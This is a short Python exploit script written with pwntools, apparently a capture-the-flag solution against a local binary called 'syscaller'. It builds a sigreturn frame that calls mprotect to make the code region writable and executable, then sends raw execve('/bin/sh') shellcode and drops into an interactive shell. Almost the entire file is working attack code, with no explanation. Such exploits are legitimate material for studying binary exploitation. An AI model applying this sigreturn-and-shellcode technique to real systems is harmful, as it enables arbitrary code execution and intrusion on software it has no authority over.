'''
Author: Samrito
Date: 2022-03-19 17:36:12
LastEditors: Samrito
LastEditTime: 2022-03-20 11:11:18
'''
from pwn import *

context.os = 'linux'
context.arch = 'amd64'
context.log_level = 'debug'

io = process(argv=['./syscaller'])

frame = SigreturnFrame()
frame.rip = 0x400104
frame.rax = 0xa  #mprotect
frame.rdi = 0x400000
frame.rsi = 0x1000
frame.rdx = 0xf
frame.rsp = 0x40011A
payload = flat([
    b'0' * 8, b'0' * 8, b'0' * 8, 0xf, b'0' * 8, b'0' * 8, b'0' * 8, b'0' * 8,
    bytes(frame)
])
shellcode = b'\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x54\x5f\x31\xf6\x31\xd2\x6a\x3b\x58\x0f\x05'
io.send(payload)
raw_input()
io.send(shellcode)

io.interactive()